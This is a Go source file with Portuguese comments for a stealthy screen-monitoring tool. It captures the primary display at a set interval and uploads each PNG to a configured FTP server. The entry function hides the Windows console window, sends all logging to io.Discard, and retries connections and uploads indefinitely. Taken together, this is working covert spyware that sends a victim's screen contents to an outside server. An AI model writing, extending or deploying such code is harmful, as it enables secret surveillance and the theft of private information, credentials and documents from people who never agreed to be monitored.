package pkg

import (
	"fmt"
	"image/png"
	"io"
	"log"
	"os"
	"path/filepath"
	"time"

	"github.com/jlaffaye/ftp"
	"github.com/kbinani/screenshot"
)

// Struct para configuração do cliente FTP
type Config struct {
	ServerAddress string // Endereço do servidor FTP (sem a porta)
	Username      string
	Password      string
	Interval      time.Duration // Intervalo de tempo entre capturas de tela (em segundos)
}

// FTPClient encapsula a funcionalidade do cliente FTP
// Esta estrutura mantém as informações de conexão e fornece métodos para interagir com o servidor FTP
type FTPClient struct {
	serverAddr string // Endereço completo do servidor com porta (ex: servidor.com:21)
	username   string
	password   string
	conn       *ftp.ServerConn // Conexão ativa com o servidor FTP
}

// Cria um novo cliente FTP
func NewFTPClient(serverIP, username, password string) *FTPClient {
	return &FTPClient{
		serverAddr: serverIP + ":21", // Adiciona a porta padrão FTP (21) ao endereço do servidor
		username:   username,
		password:   password,
	}
}

// Connect estabelece conexão com o servidor FTP
// Tenta conectar até 3 vezes antes de desistir, com intervalo de 2 segundos entre tentativas
func (c *FTPClient) Connect() error {
	var err error
	for i := 1; i <= 3; i++ { // Tenta conectar até 3 vezes
		c.conn, err = ftp.Dial(c.serverAddr, ftp.DialWithTimeout(5*time.Second)) // Conecta com timeout de 5 segundos
		if err == nil {
			break // Se conectou com sucesso, sai do loop
		}
		time.Sleep(2 * time.Second) // Espera 2 segundos antes de tentar novamente
	}
	if err != nil {
		return err // Retorna erro se todas as tentativas falharem
	}

	// Tenta autenticar com o servidor usando nome de usuário e senha
	err = c.conn.Login(c.username, c.password)
	if err != nil {
		c.Disconnect() // Fecha a conexão se a autenticação falhar
		return err
	}
	return nil // Retorna nil se a conexão e autenticação foram bem-sucedidas
}

// Fecha a conexão FTP
func (c *FTPClient) Disconnect() {
	if c.conn != nil {
		c.conn.Quit()
	}
}

// Faz upload de um arquivo para o servidor FTP
// Recebe um leitor para o conteúdo do arquivo e o nome do arquivo remoto
func (c *FTPClient) UploadFile(file io.Reader, remoteFilename string) error {
	return c.conn.Stor(remoteFilename, file) // Usa o comando STOR do FTP para enviar o arquivo
}

// Captura uma screenshot e faz upload para o servidor FTP
func CaptureAndUploadScreenshot(client *FTPClient) error {
	// Captura a screenshot
	bounds := screenshot.GetDisplayBounds(0)   // Pega screenshot do monitor principal
	img, err := screenshot.CaptureRect(bounds) // Captura a imagem da tela
	if err != nil {
		return err
	}

	// Cria arquivo temporário
	tempDir := os.TempDir()                                                                         // Obtém o diretório temporário do sistema
	tempFilePath := filepath.Join(tempDir, fmt.Sprintf("screenshot_%d.png", time.Now().UnixNano())) // Cria nome único baseado no timestamp
	file, err := os.Create(tempFilePath)                                                            // Cria o arquivo temporário
	if err != nil {
		return err
	}

	// Salva a screenshot no arquivo
	err = png.Encode(file, img) // Codifica a imagem em formato PNG
	file.Close()                // Fecha o arquivo após salvar
	if err != nil {
		os.Remove(tempFilePath) // Remove o arquivo temporário em caso de erro
		return err
	}

	// Reabre o arquivo para leitura
	file, err = os.Open(tempFilePath)
	if err != nil {
		os.Remove(tempFilePath) // Remove o arquivo temporário em caso de erro
		return err
	}
	defer file.Close()            // Garante que o arquivo será fechado ao final
	defer os.Remove(tempFilePath) // Garante que o arquivo temporário será removido ao final

	// Faz upload do arquivo
	remoteFilename := fmt.Sprintf("screenshot_%s.png", time.Now().Format("20060102_150405")) // Cria nome baseado na data/hora atual
	err = client.UploadFile(file, remoteFilename)                                            // Envia o arquivo para o servidor FTP
	return err
}

// Inicia monitoramento e a função é o ponto de entrada principal para iniciar o monitoramento
func StartMonitoringWithConfig(config Config) {
	// Esconde a janela do console no Windows
	HideConsoleWindow() // Função específica de plataforma para ocultar o console

	// Desabilita a saída do console
	log.SetOutput(io.Discard) // Redireciona logs para "lugar nenhum"

	// Cria cliente FTP
	client := NewFTPClient(
		config.ServerAddress, // Endereço do servidor da configuração
		config.Username,      // Nome de usuário da configuração
		config.Password,      // Senha da configuração
	)

	// Conecta ao servidor FTP
	err := client.Connect()
	if err != nil {
		return // Se não conseguir conectar, encerra a função
	}
	defer client.Disconnect() // Garante que a conexão será fechada ao final

	// Inicia loop de captura de screenshots
	ticker := time.NewTicker(time.Duration(config.Interval) * time.Second) // Cria ticker com intervalo da configuração
	defer ticker.Stop()                                                    // Garante que o ticker será parado ao final

	// Captura screenshot inicial
	_ = CaptureAndUploadScreenshot(client) // Ignora erro da primeira captura

	// Continua capturando screenshots periodicamente
	for range ticker.C { // Para cada "tick" do ticker
		// Se o upload falhar, tenta reconectar
		if err := CaptureAndUploadScreenshot(client); err != nil {
			client.Disconnect()                      // Desconecta para limpar a conexão com erro
			if err := client.Connect(); err != nil { // Tenta reconectar
				time.Sleep(10 * time.Second) // Espera 10 segundos antes de tentar novamente
			}
		}
	}
}
